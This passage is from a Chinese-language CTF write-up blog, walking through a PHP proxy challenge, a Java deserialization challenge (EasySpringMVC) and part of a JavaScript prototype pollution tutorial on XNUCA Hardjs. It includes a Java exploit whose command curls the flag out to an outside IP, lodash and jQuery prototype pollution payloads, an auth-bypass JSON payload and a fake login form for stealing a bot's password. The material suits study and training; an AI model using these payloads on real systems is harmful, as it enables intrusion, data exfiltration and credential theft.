<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面的关键代码可以看到，要得到flag,需要满足<code>$data[&#39;success&#39;] === true</code>，如果请求代理到我们的服务器，然后回向<a href="http://127.0.0.1:5000/api/eligible发送请求，如果发送的请求，json解码后，$data[&#39;success&#39;]为true,就会得到flag。" target="_blank" rel="noopener">http://127.0.0.1:5000/api/eligible发送请求，如果发送的请求，json解码后，$data[&#39;success&#39;]为true,就会得到flag。</a></p>
<p>解题步骤</p>
<ul>
<li>用我们的apache服务器作为代理服务器</li>
</ul>
<p><img src="/2020/02/29/V/image-20200229192230132.png" alt="image-20200229192230132"></p>
<ul>
<li><p>然后用php在本地起一个服务器，监听5000端口，在api/eligible目录下新建index.php,脚本输出，解码后$data[‘success’]为true。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"success"</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode($a);</span><br></pre></td></tr></table></figure>

<p>本地在用php启一个php的内置服务器，端口为5000</p>
<p><img src="/2020/02/29/V/image-20200229193926226.png" alt="image-20200229193926226"></p>
</li>
<li><p>然后burp再发包，触发条件，得到flag。</p>
</li>
</ul>
<p><img src="/2020/02/29/V/image-20200229194145302.png" alt="image-20200229194145302"></p>
<h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>考点：java反序列化</p>
<p>题目给了源码是war包，用tomcat部署后，</p>
<p><img src="/2020/02/29/V/image-20200301110922154.png" alt="image-20200301110922154"></p>
<p>浏览一下功能，可以上传，但是要webmanage权限，开始以为要修改权限，上传个图片马 什么的。</p>
<p>然后审计源码，由于之前没有做过java的题，对java的程序框架不是很了解，一边百度一边理解，<img src="/2020/02/29/V/image-20200301111336301.png" alt></p>
<p>程序大致的框架就是这样（本人的理解），有控制器，有jsp文件，lib文件夹里面的都是引用的jar包，看了里面的jar包，没有反序列化漏洞的版本。这里的ClientinfoFilter就是一个全局过滤器，在web.xml文件中，</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>clientinfo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.filters.ClentInfoFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>clientinfo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>*<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>filter-class  必需元素，它指定过滤器实现类的完全限定名。</p>
<p>filter-name  这个必需的元素必须与用filter元素声明时给予过滤器的名称相匹配。</p>
<p>servlet-name  此元素给出一个名称，此名称必须与利用servlet元素给予servlet或JSP页面的名称相匹配。</p>
</blockquote>
<p><a href="http://www.51gjie.com/javaweb/868.html" target="_blank" rel="noopener">参考链接</a></p>
<p><img src="/2020/02/29/V/image-20200301112633247.png" alt="image-20200301112633247"></p>
<p>然后我们继续看ClientinfoFilter中的doFilter方法，</p>
<p><img src="/2020/02/29/V/image-20200301112812260.png" alt="image-20200301112812260"></p>
<p>首先去取cookie,如果cookie中有cinfo,exist就为true,然后进入判断，将cookie中的cinfo值base64解码，然后调用Tools.parse()方法，继续跟进</p>
<p><img src="/2020/02/29/V/image-20200301113107762.png" alt="image-20200301113107762"></p>
<p>parse方法对输入进行了反序列化，可以发现Tools类重写了readObject方法，<a href="http://www.lmxspace.com/2019/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%B7%B1%E7%A9%B6/" target="_blank" rel="noopener">那么参考大佬的文章</a>，重写反序列化方法会有风险，而且这里重写的方法还调用了ProcessBuilder().start)(),这个方法可以执行命令，到了这里，我们的思路就很清晰了，通过构造cookie,触发反序列化，调用重写的readObject方法，进而调用ProcessBuilder.start()方法，执行命令。</p>
<p>首先，我们在本地尝试一下可不可以，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//exp.java</span></span><br><span class="line"><span class="keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Tools test = <span class="keyword">new</span> Tools();</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = Tools.create(test);</span><br><span class="line">            Base64.Encoder  encoder = Base64.getEncoder();</span><br><span class="line">            System.out.println(encoder.encodeToString(bytes));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上图我们可以看到create()方法中调用了writeObject，所以我们可以重写writeObject（）函数，来进一步利用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Tools.java</span></span><br><span class="line"><span class="keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tools</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String testCall;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tools</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(bytes));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] create(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        (<span class="keyword">new</span> ProcessBuilder((String[])((String[])obj))).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="comment">//String[] cmd=&#123;"/bin/sh", "-c","curl -d `/readflag` 174.0.219.93:8888"&#125;;</span></span><br><span class="line">        String[] cmd=&#123;<span class="string">"calc"</span>&#125;;</span><br><span class="line">        out.writeObject(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/29/V/image-20200301120719913.png" alt="image-20200301120719913"></p>
<p>将运行后的base64，放入test.java中测试一下</p>
<p><img src="/2020/02/29/V/image-20200301120834520.png" alt="image-20200301120834520"></p>
<p>之后就可以执行命令了，<a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">这里参考一下师傅的文章</a>，里面讲解了Runtime.getRuntime().exec(cmd)和ProcessBuilder pb=new ProcessBuilder(cmd)的区别和用法，</p>
<p>然后我们把命令改下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">      String[] cmd=&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>,<span class="string">"curl -d `/readflag` 174.0.219.93:8888"</span>&#125;;</span><br><span class="line">      <span class="comment">//String[] cmd=&#123;"calc"&#125;;</span></span><br><span class="line">      out.writeObject(cmd);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>生成的替换下cookie,就得到了 flag</p>
<p><img src="/2020/02/29/V/image-20200301122930606.png" alt="image-20200301122930606"></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Javascript原型链污染</title>
    <url>/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<p>通过几道ctf题学习Javascript 原型链污染 </p>
<a id="more"></a>

<h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><p>javascript原型链污染，网上介绍原理的文章已经很多了，最经典的还是P神分析的那篇<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">文章</a>，这里就不在详细的介绍原理了，简单来说，就是</p>
<blockquote>
<p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
</blockquote>
<p>最后上一张图，来更清晰的理解。</p>
<img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225142328583.png" alt="image-20200225142328583" style="zoom:200%;">

<h3 id="XNUCA-Hardjs"><a href="#XNUCA-Hardjs" class="headerlink" title="XNUCA Hardjs"></a>XNUCA Hardjs</h3><p>这道题有很多解，我们可以下到源码，在网页上了解一下大致的功能，可以注册、登录。登录后可以添加一些内容。接下来审计源码，这种有<code>package.json</code>文件的源码，我们可以先用<code>npm  audit</code>命令来检测一下第三方的库有没有漏洞。</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225142924459.png" alt="image-20200225142924459"></p>
<p>可以看到lodash包有原型链污染漏洞。</p>
<p>找到<a href="https://snyk.io/vuln/SNYK-JS-LODASH-450202" target="_blank" rel="noopener">poc</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">'lodash'</span>).defaultsDeep;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">'&#123;"constructor": &#123;"prototype": &#123;"a0": true&#125;&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    mergeFn(&#123;&#125;, <span class="built_in">JSON</span>.parse(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">check();</span><br></pre></td></tr></table></figure>

<p>然后我们审计源码，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">"/get"</span>,auth,<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userid = req.session.userid ; </span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">"select count(*) count from `html` where userid= ?"</span></span><br><span class="line">    <span class="comment">// var sql = "select `dom` from  `html` where userid=? ";</span></span><br><span class="line">    <span class="keyword">var</span> dataList = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(dataList[<span class="number">0</span>].count == <span class="number">0</span> )&#123;</span><br><span class="line">        res.json(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].count &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Merge the recorder in the database."</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"select `id`,`dom` from  `html` where userid=? "</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">            lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">"delete from `html` where id = ?"</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,raws[i].id);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"insert into `html` (`userid`,`dom`) values (?,?) "</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,[userid, <span class="built_in">JSON</span>.stringify(doms) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.affectedRows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            ret.push(doms);</span><br><span class="line">            res.json(ret);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.json([&#123;&#125;]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Return recorder is less than 5,so return it without merge."</span>);</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"select `dom` from  `html` where userid=? "</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">var</span> i =<span class="number">0</span> ;i&lt; raws.length ; i++)&#123;</span><br><span class="line">            ret.push(<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(ret);</span><br><span class="line">        res.json(ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>在get路由中<code>dataList[0].count &gt; 5</code>时，会进行merge,如果我们可以控制raws[i].dom，我们就可以进行原型链污染，审计源码可以知道raws[i].dom为我们在add路由中输入的数据，那么我们就可以进行原型链污染，然后我们去找可以污染的对象，一般如果看到形如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(aaaaa.xxxx)</span><br><span class="line">&#123;</span><br><span class="line">		..........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样的就可以通过原型链污染来进行进一步的利用。</p>
<h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>题目给的源码中我们可以看见有一个rebot.py，并且其中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chrome_options.add_argument(<span class="string">'--disable-xss-auditor'</span>)</span><br></pre></td></tr></table></figure>

<p>那么，xss一定是出题人留的一条利用链，从rebot.py可以看到，密码就是flag，bot是直接访问的127.0.0.1，然后从响应中提取用户名和密码的输入框，然后输入用户名和密码，登录。这里看上去我们是没办法利用的，但是分析我们可以通过原型链污染来bypass。在前端的代码中，用了3.3.0版本的jquery，jquery的$.extend方法也存在原型链污染漏洞，</p>
<p>poc:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = $.extend(<span class="literal">true</span>, &#123;&#125;, <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"__proto__": &#123;"devMode": true&#125;&#125;'</span>))</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.devMode); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>在前端app.js中</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params">allNode</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">	$.ajax(&#123;</span><br><span class="line">		url:<span class="string">"/get"</span>,</span><br><span class="line">		type:<span class="string">"get"</span>,</span><br><span class="line">		<span class="keyword">async</span>:<span class="literal">false</span>,</span><br><span class="line">		success: <span class="function"><span class="keyword">function</span>(<span class="params">datas</span>)</span>&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span> ;i&lt;datas.length; i++)&#123;</span><br><span class="line">				$.extend(<span class="literal">true</span>,allNode,datas[i])</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// console.log(allNode);</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用了$.extend()方法，</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225145755746.png" alt="image-20200225145755746"></p>
<p>并且这个getAll会在页面加载的时候执行。并且在加载页面的侯还进行了页面动态渲染，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> hints = &#123;</span><br><span class="line">		header : <span class="string">"自定义内容"</span>,</span><br><span class="line">		notice: <span class="string">"自定义公告"</span>,</span><br><span class="line">		wiki : <span class="string">"自定义wiki"</span>,</span><br><span class="line">		button:<span class="string">"自定义内容"</span>,</span><br><span class="line">		message: <span class="string">"自定义留言内容"</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">for</span>(key <span class="keyword">in</span> hints)&#123;</span><br><span class="line">		<span class="comment">// console.log(key);</span></span><br><span class="line">		element = $(<span class="string">"li[type='"</span>+key+<span class="string">"']"</span>); </span><br><span class="line">		<span class="keyword">if</span>(element)&#123;</span><br><span class="line">			element.find(<span class="string">"span.content"</span>).html(hints[key]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>如果我们可以利用原型链污染在页面加载的时候在页面中插入登录表单并链接到我们的vps,那么我们就可以进行xss,得到flag了。在上面动态渲染的时候，会把hints的键值对渲染到页面，如果我们像要插入东西的话，就必须寻找一个既有type 又有content的标签。logger刚好能满足这个条件。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"am-g error-log"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"am-list am-in"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">type</span>=<span class="string">"logger"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-12 col-sm-centered"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pre</span> <span class="attr">class</span>=<span class="string">"am-pre-scrollable"</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"am-text-success"</span>&gt;</span>[Tue Jan 11 17:32:52 9]<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"am-text-danger"</span>&gt;</span>[info]<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>StoreHtml init success .....<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">      </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们在本地测试一下果然可以。</p>
<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225151619001.png" alt>那么我们只要在这里插入一个登录的表单，或者一个表单重定向的链接，就可以进行xss了，但是这里还有一个问题，就是bot默认访问127.0.0.1时进入的时登录界面，不会是我们原型链污染后的界面，所以我们继续看，在server.js中</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">"/"</span>,auth,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    res.render(<span class="string">'index'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// var session = req.session;</span></span><br><span class="line">    <span class="keyword">if</span>(!req.session.login || !req.session.userid )&#123;</span><br><span class="line">        res.redirect(<span class="number">302</span>,<span class="string">"/login"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>/路由中，如果我们通过了auth函数，就会直接到index的模板中，我们需要绕过这个auth函数，在函数中，开始的时候session是没有login和userid属性的，所以可以利用原型链污染来绕过这里。从而达到我们的利用目的。</p>
<p>下面是实际操作的步骤</p>
<p>先注册登录，重复发送6次payload，绕过auth函数。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>:<span class="string">"test"</span>,<span class="attr">"content"</span>:&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"prototype"</span>:&#123;<span class="attr">"login"</span>:<span class="literal">true</span>,<span class="attr">"userid"</span>:<span class="number">1</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/25/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20200225153310973.png" alt="image-20200225153310973"></p>
<p>然后我们访问get界面，触发原型链污染，然后清空cookie,仍可访问，说明已经绕过auth函数，接下来插入logger</p>
<p>,在vps上写好登录框</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">class</span>=<span class="string">"am-form"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"email"</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">id</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"remember-me"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"remember-me"</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>&gt;</span></span><br><span class="line">          记住密码</span><br><span class="line">        <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"am-cf"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"登录"</span> <span class="attr">class</span>=<span class="string">"am-btn am-btn-primary am-btn-sm am-fl"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"location.replace('&lt;%= next %&gt;')"</span> <span class="attr">value</span>=<span class="string">"注册"</span> <span class="attr">class</span>=<span class="string">"am-btn am-btn-default am-btn-sm am-fr"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 